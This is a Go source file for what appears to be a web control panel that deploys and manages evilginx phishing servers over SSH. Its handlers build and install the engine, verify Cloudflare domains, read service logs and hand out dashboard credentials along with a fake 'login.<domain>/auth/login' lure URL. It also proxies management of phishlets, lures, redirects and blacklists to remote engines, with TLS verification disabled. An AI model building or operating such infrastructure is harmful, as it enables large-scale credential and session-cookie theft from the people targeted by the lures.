package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// panel state / settings
// ---------------------------------------------------------------------------

func (a *App) handleState(w http.ResponseWriter, r *http.Request) {
	set := a.store.Settings()
	_, goErr := exec.LookPath("go")
	writeJSON(w, 200, map[string]interface{}{
		"version":     version,
		"host":        hostname(),
		"auth":        a.authEnabled(),
		"store":       a.store.Path(),
		"uptime":      int64(time.Since(a.started).Seconds()),
		"bin_amd64":   set.BinAmd64,
		"bin_arm64":   set.BinArm64,
		"repo_dir":    set.RepoDir,
		"auto_build":  set.AutoBuild,
		"go_found":    goErr == nil,
		"amd64_ready": fileExists(set.BinAmd64),
		"arm64_ready": fileExists(set.BinArm64),
		"profiles":    len(a.store.List()),
		"jobs":        len(a.jobs.list()),
	})
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func (a *App) handleSettings(w http.ResponseWriter, r *http.Request) {
	var s Settings
	if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if err := a.store.SetSettings(s); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "ok"})
}

func (a *App) handleBuild(w http.ResponseWriter, r *http.Request) {
	j := a.newJob("", "build")
	go func() {
		defer func() {
			if rec := recover(); rec != nil {
				j.done(fmt.Errorf("panic: %v", rec))
			}
		}()
		j.done(a.runBuild(j))
	}()
	writeJSON(w, 200, map[string]string{"job": j.ID})
}

func (a *App) runBuild(j *Job) error {
	set := a.store.Settings()
	if _, err := exec.LookPath("go"); err != nil {
		return fmt.Errorf("'go' not found in PATH")
	}
	type tgt struct {
		arch string
		out  string
	}
	targets := []tgt{{"amd64", set.BinAmd64}, {"arm64", set.BinArm64}}
	for _, t := range targets {
		if t.out == "" {
			continue
		}
		j.logf("building linux/%s → %s", t.arch, t.out)
		_ = os.MkdirAll(filepath.Dir(t.out), 0o755)
		cmd := exec.Command("go", "build", "-mod=mod", "-o", t.out, ".")
		cmd.Dir = set.RepoDir
		cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH="+t.arch, "CGO_ENABLED=0")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("go build %s failed: %v\n%s", t.arch, err, string(out))
		}
		st, _ := os.Stat(t.out)
		if st != nil {
			j.logf("  ok: %.1f MB", float64(st.Size())/1024/1024)
		}
	}
	j.log("build complete")
	return nil
}

func (a *App) handleCFVerify(w http.ResponseWriter, r *http.Request) {
	var b struct {
		Token  string `json:"token"`
		Domain string `json:"domain"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if err := cfVerify(b.Token); err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	out := map[string]interface{}{"status": "ok"}
	if b.Domain != "" {
		z, err := cfZoneID(b.Token, b.Domain)
		if err != nil {
			jsonErr(w, 400, err.Error())
			return
		}
		out["zone_id"] = z
	}
	writeJSON(w, 200, out)
}

// ---------------------------------------------------------------------------
// profiles
// ---------------------------------------------------------------------------

func (a *App) handleProfiles(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]interface{}{"profiles": a.store.List()})
}

func (a *App) handleProfileGet(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	writeJSON(w, 200, p)
}

func (a *App) handleProfileSave(w http.ResponseWriter, r *http.Request) {
	var p Profile
	if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if strings.TrimSpace(p.Host) == "" {
		jsonErr(w, 400, "host is required")
		return
	}
	saved, err := a.store.Upsert(&p)
	if err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, saved)
}

func (a *App) handleProfileDelete(w http.ResponseWriter, r *http.Request) {
	if err := a.store.Delete(r.PathValue("id")); err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

// ---------------------------------------------------------------------------
// ssh ops
// ---------------------------------------------------------------------------

func (a *App) handleTest(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		a.store.Update(p.ID, func(pp *Profile) { pp.LastError = err.Error(); pp.LastStatus = "unreachable" })
		jsonErr(w, 400, err.Error())
		return
	}
	defer c.Close()
	pr, err := c.Probe()
	if err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	a.store.Update(p.ID, func(pp *Profile) {
		pp.LastStatus = "reachable"
		pp.LastError = ""
		pp.LastSeen = time.Now().Unix()
	})
	writeJSON(w, 200, map[string]interface{}{"status": "ok", "probe": pr, "host_key": p.HostKeyFP})
}

func (a *App) handleStatus(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	st := a.checkStatus(p)
	a.store.Update(p.ID, func(pp *Profile) {
		if st.Reachable {
			pp.LastStatus = st.Service
			pp.LastError = ""
			pp.LastSeen = time.Now().Unix()
			pp.Version = st.Version
		} else {
			pp.LastStatus = "unreachable"
			pp.LastError = st.Error
		}
	})
	writeJSON(w, 200, st)
}

func (a *App) handleLogs(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	n := 200
	if v := r.URL.Query().Get("lines"); v != "" {
		if x, err := strconv.Atoi(v); err == nil && x > 0 && x <= 2000 {
			n = x
		}
	}
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		jsonErr(w, 400, err.Error())
		return
	}
	defer c.Close()
	out, _ := c.Run(fmt.Sprintf("journalctl -u evilginx -n %d --no-pager -o cat", n))
	writeJSON(w, 200, map[string]string{"log": out})
}

func (a *App) handleInstall(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	var o InstallOpts
	if err := json.NewDecoder(r.Body).Decode(&o); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	if p.Domain == "" {
		jsonErr(w, 400, "set a domain on the profile first")
		return
	}
	if p.DashboardPass == "" {
		p.DashboardPass = rndHex(6)
		_, _ = a.store.Upsert(p)
	}
	j := a.StartInstall(p, o)
	writeJSON(w, 200, map[string]string{"job": j.ID})
}

func (a *App) handleUpdate(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	j := a.StartUpdate(p)
	writeJSON(w, 200, map[string]string{"job": j.ID})
}

func (a *App) handleAction(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	var b struct {
		Action string `json:"action"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		jsonErr(w, 400, "invalid body")
		return
	}
	j := a.StartAction(p, b.Action)
	writeJSON(w, 200, map[string]string{"job": j.ID})
}

func (a *App) handleUninstall(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	j := a.StartUninstall(p)
	writeJSON(w, 200, map[string]string{"job": j.ID})
}

func (a *App) handleHandoff(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	out := map[string]string{
		"dashboard_http": "http://" + p.Host + ":5000",
		"dashboard_user": p.DashboardUser,
		"dashboard_pass": p.DashboardPass,
	}
	if p.Domain != "" {
		out["dashboard_https"] = "https://" + p.DashboardSub + "." + p.Domain
		out["lure"] = "https://login." + p.Domain + "/auth/login"
	}
	writeJSON(w, 200, out)
}

// handleEngineProxy forwards a request to the selected server's engine API
// (http://host:5000/api/v1/... by default) so the Control Panel can manage
// phishlets, lures, redirects, blacklist and settings remotely.
func (a *App) handleEngineProxy(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	base := strings.TrimRight(p.EngineURL, "/")
	if base == "" {
		base = "http://" + net.JoinHostPort(p.Host, "5000")
	}
	rest := r.PathValue("rest")
	target := base + "/api/v1/" + rest
	if r.URL.RawQuery != "" {
		target += "?" + r.URL.RawQuery
	}

	var body []byte
	if r.Body != nil {
		body, _ = io.ReadAll(io.LimitReader(r.Body, 8<<20))
	}
	req, err := http.NewRequestWithContext(r.Context(), r.Method, target, bytes.NewReader(body))
	if err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	if ct := r.Header.Get("Content-Type"); ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	if p.DashboardUser != "" || p.DashboardPass != "" {
		req.SetBasicAuth(p.DashboardUser, p.DashboardPass)
	}

	client := &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		jsonErr(w, 502, "engine unreachable: "+err.Error())
		return
	}
	defer resp.Body.Close()
	for k, vs := range resp.Header {
		if strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Connection") {
			continue
		}
		for _, v := range vs {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, resp.Body)
}

func (a *App) handleEnginePing(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	base := strings.TrimRight(p.EngineURL, "/")
	if base == "" {
		base = "http://" + net.JoinHostPort(p.Host, "5000")
	}
	req, _ := http.NewRequestWithContext(r.Context(), "GET", base+"/api/v1/me", nil)
	if p.DashboardUser != "" || p.DashboardPass != "" {
		req.SetBasicAuth(p.DashboardUser, p.DashboardPass)
	}
	client := &http.Client{Timeout: 15 * time.Second, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	resp, err := client.Do(req)
	if err != nil {
		writeJSON(w, 200, map[string]interface{}{"reachable": false, "url": base, "error": err.Error()})
		return
	}
	defer resp.Body.Close()
	writeJSON(w, 200, map[string]interface{}{"reachable": resp.StatusCode == 200, "url": base, "status": resp.StatusCode})
}

// ---------------------------------------------------------------------------
// jobs
// ---------------------------------------------------------------------------

func (a *App) handleJobs(w http.ResponseWriter, r *http.Request) {
	type row struct {
		ID        string `json:"id"`
		ProfileID string `json:"profile_id"`
		Kind      string `json:"kind"`
		Status    string `json:"status"`
		Started   int64  `json:"started"`
		Finished  int64  `json:"finished"`
	}
	var rows []row
	for _, j := range a.jobs.list() {
		j.mu.Lock()
		rows = append(rows, row{j.ID, j.ProfileID, j.Kind, j.Status, j.Started, j.Finished})
		j.mu.Unlock()
	}
	writeJSON(w, 200, map[string]interface{}{"jobs": rows})
}

func (a *App) handleJob(w http.ResponseWriter, r *http.Request) {
	j := a.jobs.get(r.PathValue("id"))
	if j == nil {
		jsonErr(w, 404, "job not found")
		return
	}
	status, errMsg, lines, result := j.snack()
	writeJSON(w, 200, map[string]interface{}{
		"id": j.ID, "kind": j.Kind, "status": status, "err": errMsg, "lines": lines, "result": result,
	})
}
